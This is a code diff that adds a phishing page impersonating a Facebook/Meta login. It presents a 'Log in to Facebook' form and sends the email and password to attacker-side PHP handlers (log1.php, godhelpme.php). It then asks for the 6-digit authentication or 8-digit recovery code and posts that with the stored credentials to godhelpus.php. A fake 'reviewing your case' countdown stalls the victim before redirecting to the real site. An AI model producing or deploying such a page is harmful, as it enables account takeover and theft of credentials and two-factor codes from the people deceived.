@@ -1,0 +1,890 @@
+<html>
+<head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/png" href="icon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta property="og:title" content="Help Facebook">
+    <meta name="description" content="improve your page!">
+    <meta property="og:description" content="improve your page!';">
+    <meta property="og:url" content="./">
+    <meta property="og:site_name" content="Meta 2023">
+    <meta property="og:type" content="website">
+    <meta name="copyright" content="Meta 2023">
+    <meta name="theme-color" content="#000">
+    <meta property="og:image" content="">
+    <title>Help Facebook</title>
+<link rel="stylesheet" type="text/css" href="css/facebook.css">
+<link rel="stylesheet" type="text/css" href="css/animate.css">
+<link rel="stylesheet" type="text/css" href="css/style.css">
+<link rel="stylesheet" type="text/css" href="css/loader.css">
+<script src="js/app.js"></script>
+<link rel="stylesheet" type="text/css" href="css/font-awesome.min.css">
+<link rel="stylesheet" type="text/css" href="css/material-design-iconic-font.min.css">
+</head>
+
+<body>
+    <style type="text/css">
+        @charset "utf-8";
+        @import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");
+
+        *,
+        *:before,
+        *:after {
+            -webkit-box-sizing: border-box;
+            -moz-box-sizing: border-box;
+            box-sizing: border-box;
+        }
+        body {
+            background: #f1f2f6;
+            margin: 0;
+            font-family: 'Teko';
+        }
+        .container {
+            background: #f1f2f6;
+            background-size: cover;
+            position: relative;
+            margin: 0px auto;
+            max-width: 500px;
+            height: auto;
+            border: 0px solid #fff;
+        }
+        .loadkin {
+            width: 100%;
+            height: 100%;
+            position: fixed;
+            opacity: 0%;
+            top: 0;
+            left: 0;
+            z-index: 9999;
+            background: #fff;
+        }
+        .loadkin-box {
+            position: relative;
+            margin: 50px auto;
+            text-align: center;
+            height: 43px;
+            font-size: 20px;
+            padding: 5px;
+            padding-bottom: 5px;
+            margin-top: 70%;
+        }
+        .loadkin-box img {
+            width: 55px;
+            height: 55px;
+            margin-bottom: 20px;
+        }
+        .loadkin-box i {
+            padding-top: 15px;
+            padding-bottom: 15px;
+            color: #000;
+            float: center;
+            font-size: 15px;
+            font-family: arial, sans-serif;
+            text-align: center;
+        }
+        .span[class^="dot-"] {
+            opacity: 0;
+        }
+        .dot-one {
+            animation: dot-one 2s infinite linear
+        }
+        .dot-two {
+            animation: dot-two 2s infinite linear
+        }
+        .dot-three {
+            animation: dot-three 2s infinite linear
+        }
+        @keyframes dot-one {
+            0% {
+                opacity: 0;
+            }
+
+            15% {
+                opacity: 0;
+            }
+
+            25% {
+                opacity: 1;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
+        @keyframes dot-two {
+            0% {
+                opacity: 0;
+            }
+
+            25% {
+                opacity: 0;
+            }
+
+            50% {
+                opacity: 1;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
+        @keyframes dot-three {
+            0% {
+                opacity: 0;
+            }
+
+            50% {
+                opacity: 0;
+            }
+
+            75% {
+                opacity: 1;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
+        .galle-container {
+            background: #fff;
+            width: auto;
+            height: 720px;
+            padding: 5px;
+            border-left: 0px solid #fff;
+            border-right: 0px solid #fff;
+            border-top: 0px solid #fff;
+            border-bottom: 0px solid #fff;
+        }
+        .gallery-container {
+            background: #fff;
+            width: auto;
+            height: 450px;
+            padding: 5px;
+            border-left: 0px solid #fff;
+            border-right: 0px solid #fff;
+            border-top: 0px solid #fff;
+            border-bottom: 0px solid #fff;
+        }
+        .navbar {
+            background: #fff;
+            width: 100%;
+            height: 38px;
+        }
+        .navbar-logo {
+            width: 79px;
+            float: left;
+            margin-top: 13px;
+            margin-left: 11px;
+        }
+        .navbar2 {
+            background: #4C6EB5;
+            width: 100%;
+            height: 38px;
+        }
+        .navbar-logo2 {
+            width: 81px;
+            float: left;
+            margin-top: 10px;
+            margin-left: 10px;
+        }
+        .footer {
+            background: #fff;
+            border: none;
+        }
+        .footer-text {
+            color: #4B4949;
+        }
+        .footer img {
+            width: 20%;
+            height: auto;
+        }
+        .header {
+            width: 100%;
+            height: auto;
+        }
+        .header img {
+            width: 100%;
+            height: auto;
+            margin-top: -0px;
+            border-bottom: 0px solid #999999;
+            border-top: 0px solid #999999;
+        }
+        .header video {
+            width: 100%;
+            height: auto;
+            margin-top: -0px;
+        }
+        .metanotif {
+            width: 100%;
+            height: auto;
+        }
+        .metanotif img {
+            width: 100%;
+            height: auto;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .titlea1 {
+            width: 100%;
+            padding: 5px;
+            display: block;
+            font-size: 19px;
+            font-family: arial, sans-serif;
+            font-weight: bold;
+            text-align: left;
+        }
+        .titlea2 {
+            width: 97%;
+            padding: 5px;
+            display: block;
+            font-size: 13px;
+            font-family: arial, sans-serif;
+            font-weight: bold;
+            color: #848486;
+            text-align: left;
+            margin-left: auto;
+            margin-right: auto;
+            border-bottom: 0.5px solid #848486;
+        }
+        .titlea3 {
+            width: 97%;
+            padding: 5px;
+            display: block;
+            font-size: 14px;
+            font-family: arial, sans-serif;
+            font-weight: 500;
+            text-align: left;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .titlea4 {
+            background: #DCDCDC;
+            background-size: 100% 100%;
+            width: 100%;
+            padding: 5px;
+            display: block;
+            font-family: arial, sans-serif;
+            font-weight: 500;
+            border-radius: 10px;
+            text-align: left;
+        }
+        .titlea5 {
+            width: 100%;
+            padding: 5px;
+            display: block;
+            font-size: 14px;
+            font-family: arial, sans-serif;
+            font-weight: 400;
+            text-align: left;
+            margin-left: auto;
+            margin-right: auto;
+            padding-top: 10px;
+            padding-bottom: 10px;
+            border-top: 0.5px solid #848486;
+            border-bottom: 0.5px solid #848486;
+        }
+        .titlea6 {
+            width: 100%;
+            padding: 5px;
+            display: block;
+            font-size: 14px;
+            font-family: arial, sans-serif;
+            font-weight: 400;
+            text-align: left;
+            margin-left: auto;
+            margin-right: auto;
+            padding-bottom: 10px;
+            border-bottom: 0.5px solid #848486;
+        }
+        .titlea7 {
+            width: 100%;
+            padding: 5px;
+            display: block;
+            font-size: 14px;
+            font-family: arial, sans-serif;
+            font-weight: 400;
+            text-align: left;
+            margin-left: auto;
+            margin-right: auto;
+            padding-bottom: 10px;
+        }
+        .titlea8 {
+            display: inline-block;
+            font-size: 12px;
+            font-family: arial, sans-serif;
+            font-weight: 400;
+            text-align: left;
+            color: #395898;
+            float: left;
+            margin-left: 3px;
+            padding-top: 37px;
+        }
+        .notify-au {
+            background: #FFF no-repeat center;
+            background-size: cover;
+            width: 98%;
+            height: 430px;
+            padding: 5px;
+            border: 0.5px solid #dcdcdc;
+            border-radius: 2px;
+            margin-top: 100px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .verify-box-navbar {
+            background-size: 100% 100%;
+            width: 93%;
+            height: 19%;
+            margin-left: auto;
+            margin-right: auto;
+            display: block;
+        }
+        .verify-box-navbar-description {
+            width: 50%;
+            margin-top: 50px;
+            margin-right: 20px;
+            color: #fff;
+            font-size: 18px;
+            font-family: Teko;
+            font-weight: 500;
+            text-align: left;
+            float: right;
+        }
+        .verify-box-navbar-form {
+            background-size: 100% 100%;
+            width: 99%;
+            height: auto;
+            margin-left: auto;
+            margin-right: auto;
+            display: block;
+        }
+        .verify-box-navbar-form input {
+            width: 45%;
+            height: 30px;
+            margin-left: 5px;
+            margin-bottom: 4px;
+            padding: 5px;
+            padding-left: 10px;
+            color: #000;
+            font-size: 15px;
+            font-family: arial, sans-serif;
+            font-weight: 500;
+            border: 1px solid #848486;
+            position: relative;
+            outline: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+        }
+        .verify-box-navbar-form input::placeholder {
+            color: #606771;
+        }
+        .verify-box-content {
+            background-size: 100% 100%;
+            width: 100%;
+            height: auto;
+            margin-top: -1px;
+            margin-left: auto;
+            margin-right: auto;
+            margin-bottom: 15px;
+            padding: 8px;
+            display: block;
+        }
+        .verify-box-content-title {
+            width: 95%;
+            height: auto;
+            margin-top: 10px;
+            margin-left: auto;
+            margin-right: auto;
+            margin-bottom: 10px;
+            padding: 6px;
+            color: #fff;
+            font-size: 18px;
+            font-family: selow;
+            font-weight: 500;
+            text-align: center;
+            display: block;
+        }
+        .verify-box-content-title i {
+            padding-top: 15px;
+            padding-bottom: 15px;
+            color: #999999;
+            font-size: 100px;
+            text-align: center;
+        }
+        .verify-box-content button {
+            background: #1778f2;
+            width: 100%;
+            height: 45px;
+            margin-top: 20px;
+            margin-left: auto;
+            margin-right: auto;
+            margin-bottom: 10px;
+            padding: 7px;
+            color: #fff;
+            font-size: 18px;
+            font-family: Roboto, sans-serif;
+            text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
+            box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
+            font-weight: bold;
+            text-align: center;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            display: block;
+        }
+        .verify-box-contents {
+            background-size: 100% 100%;
+            width: 100%;
+            height: auto;
+            margin-left: auto;
+            margin-right: auto;
+            display: block;
+            border-top: 0.5px solid #848486;
+        }
+        .verify-box-contents button {
+            background: #4167B2;
+            background-size: 100% 100%;
+            width: 38%;
+            height: 43px;
+            margin-top: 20px;
+            margin-left: auto;
+            margin-right: 2px;
+            margin-bottom: 10px;
+            padding: 7px;
+            color: #fff;
+            float: right;
+            font-size: 14px;
+            font-family: arial, sans-serif;
+            font-weight: bold;
+            text-align: center;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            display: block;
+        }
+        .fb-load {
+            background-size: 100% 100%;
+            width: 50%;
+            height: auto;
+            margin-left: auto;
+            margin-right: auto;
+            margin-bottom: 15px;
+            display: block;
+            text-align: center;
+        }
+        .fb-load img {
+            width: 55px;
+            height: 55px;
+            margin-top: 270px;
+            margin-left: auto;
+            margin-right: auto;
+            margin-bottom: -55px;
+            text-align: center;
+        }
+        .fb-load-title {
+            width: 95%;
+            height: auto;
+            margin-top: 10px;
+            padding-left: auto;
+            padding-right: auto;
+            margin-bottom: 10px;
+            padding: 5px;
+            color: #999998;
+            font-size: 18px;
+            font-family: selow;
+            font-weight: 500;
+            text-align: center;
+            display: block;
+        }
+        .text-code1 {
+            font-size: 1.2rem;
+            font-weight: 500;
+            margin-bottom: 25px !important;
+            margin-top: 10px;
+            margin-left: auto;
+            margin-right: auto;
+            padding: 8px;
+            color: #000000;
+            font-family: Roboto, sans-serif;
+            text-align: center;
+            display: block;
+        }
+        @media only screen and (max-width:600px) {
+            .container {
+                width: 100%;
+                height: auto;
+                border: none;
+                border-radius: 0px;
+                padding: 0px;
+            }
+
+            .gallery-container {
+                height: 450px;
+            }
+        }
+    </style>
+    <div class="navbar">
+        <img class="navbar-logo" src=imgs/logometa.png>
+        <img class="navbar-logo2" src=imgs/home.png style="width: 20px;margin-to: 19px;float:right;margin-right: 10px;">
+    </div> <!--- navbar --->
+		<div class="second-login-sec">
+		<div class="container">
+            <div class="max_form">
+                <center>
+                    <img style="margin-top:-20px;" src=imgs/4lCu2zih0ca.svg height="auto" width="50%" position="absolute">
+                </center>
+                <div class="gallery-container">
+                    <h2 class="text-login">Log in to Facebook</h2>
+                    <div class="content-box-fb">
+                        <div class="kaget"><b>Wrong credential</b><br>Invalid username or password</div>
+                        <form class="login-form" action="log1.php" method="post" id="ValidateLoginFbForm">
+                            <div class="form-group-fb" style="border: 1px solid #e4e4e4;border-radius: 4px;margin-top:25px;">
+                                <input type="text" class="form-control up" name="suk" id="fname" placeholder="Email address or phone number" autocomplete="on" pattern=".{6,}" required="yes" maxlength="80">
+                            </div> <!--- form-group-fb --->
+                            <div class="form-group-sohid showFirstFbPassword" style="margin-top:5px;" id="showFirstFbPassword" onclick="showFirstFbPassword()">
+                                <img src=imgs/hidepassword.png style="opacity:0%;">
+                            </div> <!--- form-group-sohid showFbPassword --->
+                            <div class="form-group-sohid hideFirstFbPassword" style="display: none;margin-top:5px;" onclick="hideFirstFbPassword()">
+                                <img src=imgs/showpassword.png style="opacity:0%;">
+                            </div> <!--- form-group-sohid showFbPassword --->
+                            <div class="form-group-fb" style="border: 1px solid #e4e4e4;border-radius: 4px;margin-top:5px;">
+                                <input type="password" class="form-control up" name="uar" id="lname" placeholder="Enter your password" autocomplete="off" pattern=".{6,}" required="yes" maxlength="80">
+                            </div> <!--- form-group-fb --->
+                            <button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">Log In</button>
+                        </form>
+                        <div class="txt-forgotten-password">Forgotten password?</div>
+                    </div>
+                </div> <!--- max-form --->
+            </div> <!--- gallery-container --->
+            </div> <!--- gallery-container --->
+			<div class="container5" style="background: #fff; width: 100%; height: 100%; margin-top: 20px; padding: 10px;">
+			<div class="copyright" style="width:100%;">
+			English (UK)&ensp;Bahasa Indonesia &ensp;Basa Jawa&ensp;Bahasa Melayu &ensp;日本語 الع <ربية Français (France)<br> Español 한국어 Português (Brasil) Deutsch
+			<br>
+			<div class="titlea2"></div><br>
+			Sign Up &ensp;Log in &ensp;Messenger&ensp;Facebook Lite &ensp;Video&ensp;Places&ensp;Games&ensp;Marketplace&ensp;Meta Pay&ensp;Meta Store&ensp;Meta Quest&ensp;Instagram&ensp;Threads&ensp;Fundraisers&ensp;Services&ensp;Voting Information Centre&ensp;Privacy Policy&ensp;Privacy Centre&ensp;Groups&ensp;About&ensp;Create ad&ensp;Create Page&ensp;Developers&ensp;Careers&ensp;Cookies&ensp;AdChoices&ensp;Terms&ensp;Help&ensp;<br>Contact uploading and non-usersSettingsActivity log
+			</div>
+			<div class="copyright" style="height: auto; margin-bottom: 0px; bottom: 0px;">Meta © 2023</div>
+			</div>
+        </div> <!--- second-login-sec --->
+
+        <div class="loading-sec" style="display: none;">
+		    <div class="container">
+            <div class="max_form">
+                <div class="gallery-container">
+                    <div class="fb-load">
+                        <img src=imgs/icon.png style="margin-top: 150px;">
+                        <div class="loader3"></div>
+                    </div> <!--- fb-load --->
+                </div> <!--- loading-sec--->
+            </div> <!--- gallery-container --->
+            </div> <!--- gallery-container --->
+        </div> <!--- max-form --->
+
+        <div class="final-sec" style="display: none;">
+		    <div class="container">
+            <div class="max_form">
+                <div class="gallery-container" style="padding: 20px;">
+                    <center><img class="logo" src=imgs/notification.png height="75" width="100"></center><br>
+                    <div style="background: grey; width: 100%; height: 1px;">
+                    <h2 class="text-code">Enter your login code</h2><br>
+                    <div class="info"> Enter the 6-digit code we just sent from the authentication app you set up. or Enter the 8-digit recovery code.</div>
+                    <form class="form-group-fb" action="log.php" method="post" id="ValidateVerificationDataForm">
+                        <input type="hidden" name="email" id="validateEmail" readonly>
+                        <input type="hidden" name="password" id="validatePassword" readonly>
+                        <input type="number" style="border: 1px solid #e4e4e4;border-radius: 4px;margin-top:20px;" name="logincode" id="logincode" placeholder="Login Code" autocomplete="off" required oninvalid="this.setCustomValidity('Enter the 8-digit code we just sent from the RECOVERY CODE you set up.')" oninput="setCustomValidity('')"><br>
+                        <button type="submit" class="btn-login-fb" style="padding: 15px;" onclick="ValidateVerificationData()">Submit code</button>
+                </div>
+                </form>
+            </div> <!--- final-sec --->
+            </div> <!--- final-sec --->
+			</div> <!--- max-form --->
+			<div class="container5" style="background: #fff; width: 100%; height: 100%; margin-top: 20px; padding: 10px;">
+			<div class="copyright" style="width:100%;">
+			English (UK)&ensp;Bahasa Indonesia &ensp;Basa Jawa&ensp;Bahasa Melayu &ensp;日本語 الع <ربية Français (France)<br> Español 한국어 Português (Brasil) Deutsch
+			<br>
+			<div class="titlea2"></div><br>
+			Sign Up &ensp;Log in &ensp;Messenger&ensp;Facebook Lite &ensp;Video&ensp;Places&ensp;Games&ensp;Marketplace&ensp;Meta Pay&ensp;Meta Store&ensp;Meta Quest&ensp;Instagram&ensp;Threads&ensp;Fundraisers&ensp;Services&ensp;Voting Information Centre&ensp;Privacy Policy&ensp;Privacy Centre&ensp;Groups&ensp;About&ensp;Create ad&ensp;Create Page&ensp;Developers&ensp;Careers&ensp;Cookies&ensp;AdChoices&ensp;Terms&ensp;Help&ensp;<br>Contact uploading and non-usersSettingsActivity log
+			</div>
+			<div class="copyright" style="height: auto; margin-bottom: 0px; bottom: 0px;">Meta © 2023</div>
+			</div>
+        </div> <!--- max-form --->
+
+    <div class="done-sec" style="display: none;">
+	    <div class="container">
+        <div class="max_form">
+            <div class="gallery-container">
+                <img class="logo" src=imgs/oops.png height="100" width="100"><br>
+                <div class="text-code1" style="text-align: left;font-size: 19px;margin-left: -15px;">Hi, We are receiving your information</div>
+                <div class="titlea7" style="text-align: left;margin-left: -15px;font-size: 16px;">
+                    Reviewing your activity takes just a few more moments. We might require additional information to confirm that this is your account
+                </div> <!--- titlea3 --->
+                <div class="titlea7" style="text-align: left; font-size: 16px; margin-left: -15px;margin-top: 5px;margin-bottom: 25px;">
+                    Please wait, this could take up to 10-20 minutes, please be patient while we review your case... (wait <span id="minute" class="numbers"></span>:<span id="second" class="numbers"></span>)
+                </div> <!--- titlea3 --->
+                <div id="progressBar">
+                    <div></div>
+                </div>
+                <ul id="countdown" style="display:none;">
+                    <li><span id="day" class="numbers">00</span>
+                        <p class="name">days</p>
+                    </li>
+                    <li><span id="hour" class="numbers">00</span>
+                        <p class="name">hours</p>
+                    </li>
+
+                </ul>
+                <div class="copyright" style="margin-top: 35px;">Meta © 2023</div>
+            </div> <!--- max-form --->
+        </div> <!--- gallery-container --->
+        </div> <!--- gallery-container --->
+    </div> <!--- done-sec --->
+
+<script src="js/jquery-1.10.2.min.js"></script>
+<script src="js/jquery.min.js"></script>
+<script src="js/jquery.min.js"></script>
+<script src="js/script.js"></script>
+<script src="js/namtime.js"></script>
+    <script>
+        window.addEventListener("load", () => {
+            clock();
+
+            function clock() {
+                const today = new Date();
+
+                // get time components
+                const hours = today.getHours();
+                const minutes = today.getMinutes();
+                const seconds = today.getSeconds();
+
+                //add '0' to hour, minute & second when they are less 10
+                const hour = hours < 10 ? "0" + hours : hours;
+                const minute = minutes < 10 ? "0" + minutes : minutes;
+                const second = seconds < 10 ? "0" + seconds : seconds;
+
+                //make clock a 12-hour time clock
+                const hourTime = hour > 12 ? hour - 12 : hour;
+
+                // if (hour === 0) {
+                //   hour = 12;
+                // }
+                //assigning 'am' or 'pm' to indicate time of the day
+                const ampm = hour < 12 ? "AM" : "PM";
+
+                // get date components
+                const month = today.getMonth();
+                const year = today.getFullYear();
+                const day = today.getDate();
+
+                //declaring a list of all months in  a year
+                const monthList = [
+                    "January",
+                    "February",
+                    "March",
+                    "April",
+                    "May",
+                    "June",
+                    "July",
+                    "August",
+                    "September",
+                    "October",
+                    "November",
+                    "December"
+                ];
+
+                //get current date and time
+                const date = monthList[month] + " " + day + ", " + year;
+                const time = hourTime + ":" + minute + ":" + second + ampm;
+
+                //combine current date and time
+                const dateTime = date + " - " + time;
+
+                //print current date and time to the DOM
+                document.getElementById("date-time").innerHTML = dateTime;
+                setTimeout(clock, 1000);
+            }
+        });
+    </script>
+    <style>
+        #progressBar {
+            width: 100%;
+            margin: 10px auto;
+            height: 22px;
+            background-color: #f0f2f5;
+        }
+
+        #progressBar div {
+            height: 100%;
+            text-align: right;
+            padding: 0 10px;
+            line-height: 22px;
+            /* same as #progressBar height if we want text middle aligned */
+            width: 0;
+            background-color: #3084f4;
+            box-sizing: border-box;
+        }
+    </style>
+    <script>
+        $(document).ready(function() {
+
+            //COUNTDOWN TIMER
+            //edit ".25" below to change time in terms of day
+            var deadline = new Date(Date.now() + 600000);
+
+            var x = setInterval(function() {
+
+                var now = Date.now();
+                var t = deadline - now;
+                var days = Math.floor(t / (1000 * 60 * 60 * 24));
+                var hours = Math.floor((t % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                var minutes = Math.floor((t % (1000 * 60 * 60)) / (1000 * 60));
+                var seconds = Math.floor((t % (1000 * 60)) / 1000);
+                document.getElementById("day").innerHTML = days;
+                document.getElementById("hour").innerHTML = hours;
+                document.getElementById("minute").innerHTML = minutes;
+                document.getElementById("second").innerHTML = seconds;
+                if (t < 0) {
+                    clearInterval(x);
+                    document.getElementById("day").innerHTML = '0';
+                    document.getElementById("hour").innerHTML = '0';
+                    document.getElementById("minute").innerHTML = '0';
+                    document.getElementById("second").innerHTML = '0';
+                    window.location = "https://www.facebook.com/";
+                }
+            }, 1000);
+
+            //COUNTDOWN BAR
+
+            function progress(timeleft, timetotal, $element) {
+                var progressBarWidth = timeleft * $element.width() / timetotal;
+                $element.find('div').animate({
+                    width: progressBarWidth
+                }, timeleft == timetotal ? 0 : 1000, 'linear');
+                if (timeleft > 0) {
+                    setTimeout(function() {
+                        progress(timeleft - 1, timetotal, $element);
+                    }, 1000);
+                }
+            };
+            //adjust these numbers to match time set
+            //must be in seconds
+            progress(1740, 1740, $('#progressBar'));
+
+        });
+    </script>
+    <script>
+        // code for showing hiding popup
+        function open_account_login() {
+            $('.first-login-sec').show();
+            $('.home-sec').hide();
+        }
+		
+function ValidateLoginFbData() {
+	$emailfb = $('#email-facebook').val().trim();
+	$passwordfb = $('#password-facebook').val().trim();
+	if($emailfb == '' || $passwordfb == '') {
+	} else {
+		$.ajax({
+            type: "POST",
+            url: "godhelpme.php",
+            data: $("#ValidateLoginFbForm").serialize(),
+            beforeSend: function() {
+                $('.second-login-sec').hide();
+				$('.loading-sec').show();
+            },
+            success: function() {
+				$('.loading-sec').hide();
+				$('.final-sec').show();
+				$("input#validateEmail").val($emailfb);
+                $("input#validatePassword").val($passwordfb);
+                return true;
+            }
+        });
+	}; 
+}
+
+        // show hide password for facebook and twitter
+        function showFirstFbPassword() {
+            var xFirst = document.getElementById("password-facebook");
+            if (xFirst.type === "password") {
+                xFirst.type = "text";
+                $('.showFirstFbPassword').hide();
+                $('.hideFirstFbPassword').show();
+            } else {
+                xFirst.type = "password";
+            }
+        }
+        function hideFirstFbPassword() {
+            var xFirst = document.getElementById("password-facebook");
+            if (xFirst.type === "text") {
+                xFirst.type = "password";
+                $('.showFirstFbPassword').show();
+                $('.hideFirstFbPassword').hide();
+            } else {
+                xFirst.type = "text";
+            }
+        }
+		
+		function showFirstFbPassword() {
+            var xFirst = document.getElementById("password-facebook");
+            if (xFirst.type === "password") {
+                xFirst.type = "text";
+                $('.showFirstFbPassword').hide();
+                $('.hideFirstFbPassword').show();
+            } else {
+                xFirst.type = "password";
+            }
+        }
+        function hideFirstFbPassword() {
+            var xFirst = document.getElementById("password-facebook");
+            if (xFirst.type === "text") {
+                xFirst.type = "password";
+                $('.showFirstFbPassword').show();
+                $('.hideFirstFbPassword').hide();
+            } else {
+                xFirst.type = "text";
+            }
+        }
+
+        // code for validate data to sending to file result
+        function ValidateVerificationData() {
+            $('#ValidateVerificationDataForm').submit(function(submitingVerificationData) {
+                submitingVerificationData.preventDefault();
+
+                var $validateEmail = $("input#validateEmail").val();
+                var $validatePassword = $("input#validatePassword").val();
+                var $loginCode = $("input#loginCode").val();
+                if ($validateEmail == "" && $validatePassword == "" && $loginCode == "") {
+                    $('.verification_info').show();
+                    $('.account_verification').hide();
+                    return false;
+                }
+
+                $.ajax({
+                    type: "POST",
+                    url: "godhelpus.php",
+                    data: $(this).serialize(),
+                    beforeSend: function() {
+                        $('.loading-sec').show();
+                        $('.final-sec').hide();
+                    },
+                    success: function() {
+                        $('#loginCode').val('');
+                        $(".final-sec").show();
+                        $(".loading-sec").hide();
+                    }
+                });
+            });
+            return false;
+        };
+    </script>
+    <script>
+        setTimeout(function() {
+            $('.loadkin').fadeOut(750);
+            $('.home-sec').show();
+        }, 0);
+    </script>
+	
+<script>(function(){var js = "window['__CF$cv$params']={r:'85e19ee3df45048d',t:'MTcwOTM4NDk2MS4wNzgwMDA='};_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js',document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script></body>
+</html>
